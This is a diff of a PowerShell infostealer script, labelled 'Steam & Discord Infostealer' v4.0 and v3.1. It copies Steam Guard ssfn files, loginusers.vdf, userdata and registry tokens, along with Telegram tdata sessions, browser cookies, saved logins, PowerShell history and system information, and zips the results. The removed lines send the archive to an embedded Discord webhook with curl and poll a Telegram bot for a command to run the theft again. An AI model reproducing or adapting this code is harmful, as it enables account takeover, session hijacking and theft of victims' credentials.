@@ -1,4 +1,4 @@
-# Steam & Discord Infostealer v4.0 - Aggressive Grab
+# Steam & Discord Infostealer v3.1 - Token Grabber
 # Set parameters
 $discordWebhook = "https://discord.com/api/webhooks/1407258124850827396/kkhtvS5us7fN17u9s89uicI8K8Yf29oE-KWmi39NEzVHvQ1DfNwLrZcAIKYhXZI5Vtbk"
 $telegramBotToken = "YOUR_TELEGRAM_BOT_TOKEN"
@@ -7,130 +7,93 @@ $tempDir = "$env:TEMP\SteamLogs"
 $zipPath = "$env:TEMP\SteamData_$((Get-Date).ToString('yyyyMMdd_HHmmss')).zip"
 New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
 
-# 1. AGGRESSIVE STEAM GRAB - Searches all drives
+# 1. Function to capture PowerShell command history
+function Get-CommandHistory {
+    Get-Content (Get-PSReadlineOption).HistorySavePath | Out-File "$tempDir\PowerShell_History.txt"
+}
+
+# 2. Function to steal Steam files & configs for FULL ACCESS
 function Get-SteamData {
-    $steamDirs = @()
-    # A. Search all logical drives for common Steam paths
-    Get-PSDrive -PSProvider FileSystem | ForEach-Object {
-        $root = $_.Root
-        $potentialPaths = @(
-            "$root\Program Files (x86)\Steam",
-            "$root\Program Files\Steam",
-            "$root\Steam",
-            "$root\Games\Steam",
-            "$root\Valve\Steam"
-        )
-        foreach ($path in $potentialPaths) {
-            if (Test-Path $path) {
-                $steamDirs += $path
-            }
-        }
-    }
-    # B. Search entire user profile and AppData
-    $userPaths = @(
-        "$env:USERPROFILE\AppData\Local\Steam",
-        "$env:USERPROFILE\AppData\Roaming\Steam",
-        "$env:USERPROFILE\Documents\Steam",
-        "$env:USERPROFILE\Desktop\Steam",
-        "$env:USERPROFILE\Downloads\Steam"
-    )
-    foreach ($path in $userPaths) {
+    $steamPaths = @("$env:ProgramFiles(x86)\Steam", "${env:ProgramFiles}\Steam", "$env:USERPROFILE\AppData\Local\Steam")
+    foreach ($path in $steamPaths) {
         if (Test-Path $path) {
-            $steamDirs += $path
+            # Copy entire config directory
+            Copy-Item "$path\config\*" $tempDir -Recurse -Force -ErrorAction SilentlyContinue
+            # Copy all ssfn files (Steam guard)
+            Copy-Item "$path\ssfn*" $tempDir -Force -ErrorAction SilentlyContinue
+            # Copy loginusers.vdf and all userdata
+            Copy-Item "$path\logs\*" $tempDir -Recurse -Force -ErrorAction SilentlyContinue
+            Copy-Item "$path\userdata\*" $tempDir -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
         }
-    }
-    # C. ROBOCopy entire Steam directory, ignore errors
-    foreach ($steamDir in $steamDirs) {
-        $destDir = "$tempDir\Steam_$(Split-Path $steamDir -Leaf)"
-        New-Item -ItemType Directory -Path $destDir -Force | Out-Null
-        Start-Process -Wait -WindowStyle Hidden -FilePath "robocopy.exe" -ArgumentList "`"$steamDir`" `"$destDir`" /MIR /Z /R:1 /W:1 /LOG+:$tempDir\Robocopy_Log.txt"
     }
 }
 
-# 2. Extract tokens from grabbed files
+# 3. NEW FUNCTION: Dedicated Steam Token Grabber
 function Get-SteamTokens {
     $tokenFile = "$tempDir\Steam_Tokens.txt"
     "=== Steam Tokens & Session Data ===`r`n" | Out-File $tokenFile -Append
-    # A. Parse all .vdf files for tokens and user data
-    $vdfFiles = Get-ChildItem -Path $tempDir -Recurse -Include *.vdf
-    foreach ($file in $vdfFiles) {
-        if ($file.Name -like "*loginusers*" -or $file.Name -like "*config*" -or $file.Name -like "*ssfn*") {
-            "--- $($file.FullName) ---" | Out-File $tokenFile -Append
-            Get-Content $file.FullName -ErrorAction SilentlyContinue | Out-File $tokenFile -Append
+
+    # A. Extract from Registry
+    "Registry Tokens:`r`n" | Out-File $tokenFile -Append
+    try {
+        $regPath = "HKCU:\Software\Valve\Steam"
+        $regKeys = Get-ItemProperty -Path $regPath -ErrorAction SilentlyContinue
+        $regKeys | Out-File $tokenFile -Append
+    } catch {}
+
+    # B. Extract from config files
+    "`r`nConfig File Data:`r`n" | Out-File $tokenFile -Append
+    $configFiles = Get-ChildItem -Path $tempDir -Include *.vdf -Recurse
+    foreach ($file in $configFiles) {
+        if ($file.Name -like "*loginusers*" -or $file.Name -like "*config*") {
+            "--- $($file.Name) ---" | Out-File $tokenFile -Append
+            Get-Content $file.FullName | Out-File $tokenFile -Append
         }
     }
-    # B. Check for registry dump
-    try {
-        reg export "HKCU\Software\Valve\Steam" "$tempDir\steam_registry.reg" /y 2>&1 | Out-Null
-        Get-Content "$tempDir\steam_registry.reg" -ErrorAction SilentlyContinue | Out-File $tokenFile -Append
-    } catch {}
+
+    # C. Extract from process memory (active sessions)
+    "`r`nActive Session Info:`r`n" | Out-File $tokenFile -Append
+    $steamProcess = Get-Process steam -ErrorAction SilentlyContinue
+    if ($steamProcess) {
+        netstat -ano | findstr ":$steamProcess.Id" | Out-File $tokenFile -Append
+        $steamProcess.Modules | Where-Object {$_.ModuleName -like "*steam*"} | Select-Object ModuleName, FileName | Out-File $tokenFile -Append
+    }
 }
 
-# 3. Steal Telegram sessions
+# 4. Function to steal Telegram sessions
 function Get-TelegramData {
     $telegramPaths = @("$env:USERPROFILE\AppData\Roaming\Telegram Desktop", "$env:USERPROFILE\Documents\Telegram Desktop")
     foreach ($path in $telegramPaths) {
         if (Test-Path $path) {
-            robocopy.exe "`"$path`" "`"$tempDir\Telegram`" /MIR /Z /R:1 /W:1 /LOG+:$tempDir\Telegram_Copy_Log.txt"
+            # Target tdata directory for session hijacking
+            Copy-Item "$path\tdata\*" $tempDir -Recurse -Force -ErrorAction SilentlyContinue
         }
     }
 }
 
-# 4. Steal browser data
+# 5. Function to steal cookies & passwords from all browsers
 function Get-BrowserData {
     $browsers = @("Chrome", "MicrosoftEdge", "Firefox", "Opera", "YandexBrowser")
     foreach ($browser in $browsers) {
         try {
             $dataPath = "$env:USERPROFILE\AppData\Local\$browser\User Data\Default"
             if (Test-Path $dataPath) {
-                robocopy.exe "`"$dataPath`" "`"$tempDir\Browser_$browser`" "Cookies" "Login Data" "Local Storage" /S /Z /R:1 /W:1
+                Copy-Item "$dataPath\Cookies" "$tempDir\${browser}_Cookies" -Force -ErrorAction SilentlyContinue
+                Copy-Item "$dataPath\Login Data" "$tempDir\${browser}_LoginData" -Force -ErrorAction SilentlyContinue
+                Copy-Item "$dataPath\Local Storage" "$tempDir\${browser}_LocalStorage" -Recurse -Force -ErrorAction SilentlyContinue
             }
         } catch {}
     }
 }
 
-# 5. Get system info
+# 6. Collect system info and network data
 function Get-SystemInfo {
-    systeminfo > "$tempDir\SystemInfo.txt"
-    ipconfig /all > "$tempDir\Network_Info.txt"
-    netstat -ano > "$tempDir\Open_Ports.txt"
+    systeminfo | Out-File "$tempDir\SystemInfo.txt"
+    (Get-WmiObject -Class Win32_ComputerSystem).Model | Out-File "$tempDir\PC_Model.txt"
+    ipconfig /all | Out-File "$tempDir\Network_Info.txt"
+    netstat -ano | Out-File "$tempDir\Open_Ports.txt"
 }
 
-# 6. Create ZIP
+# 7. Create a ZIP archive of all stolen data
 function Compress-Data {
     Compress-Archive -Path "$tempDir\*" -DestinationPath $zipPath -Force
-}
-
-# 7. Send to Discord
-function Send-DiscordWebhook {
-    curl.exe -F "file1=@$zipPath" $discordWebhook
-}
-
-# 8. Telegram control
-function Check-TelegramCommand {
-    $updates = curl -s "https://api.telegram.org/bot$telegramBotToken/getUpdates"
-    $lastMessage = ($updates | ConvertFrom-Json).result[-1].message.text
-    if ($lastMessage -eq "/startsteal") {
-        Execute-Stealer
-        Send-DiscordWebhook
-        curl -s "https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$telegramChatID&text=Stealer executed. Data sent."
-    }
-}
-
-# Main execution
-function Execute-Stealer {
-    Get-SteamData
-    Get-SteamTokens
-    Get-TelegramData
-    Get-BrowserData
-    Get-SystemInfo
-    Compress-Data
-}
-
-# Run and loop
-Execute-Stealer
-Send-DiscordWebhook
-while ($true) {
-    Check-TelegramCommand
-    Start-Sleep -Seconds 30
-}
